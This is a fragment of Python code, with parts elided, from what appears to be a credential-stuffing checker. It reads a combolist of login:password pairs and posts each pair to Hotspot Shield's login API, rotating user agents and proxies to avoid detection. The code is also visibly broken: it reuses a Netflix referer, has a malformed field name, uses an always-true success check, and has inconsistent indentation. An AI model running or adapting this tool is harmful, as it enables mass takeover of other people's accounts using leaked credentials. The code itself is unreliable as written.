...
if choice == 0:
 ...
 def getCombos(self):
        try:
            ...
            print(f'[{Fore.LIGHTRED_EX}!{Fore.RESET}] Failed to open combolist :(')
            os.system('pause >nul')
            quit()
...
# Headers might break lmao 

            headers = {"user-agent": ua().random,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "accept-language": "en-US,en;q=0.9", "accept-encoding": "gzip, deflate, br", "referer": "https://www.netflix.com/login", "content-type": "application/json","cookie":""}
            data = {"userLoginId:": login, "password": password}  
            
            request = client.post("https://app.hotspotshield.com/api/user/login",headers =headers, data =data ,proxies =random.choice(self.proxies))
            cookie = dict(flwssn=client.get("https://app.hotspotshield.com/api/user/login", headers ={"User-Agent": ua().random}, proxies =random.choice(self.proxies)).cookies.get("flwssn"))

if 'PWD INCORRECT' or '"status":false' in request.text:
                self.lock.acquire()
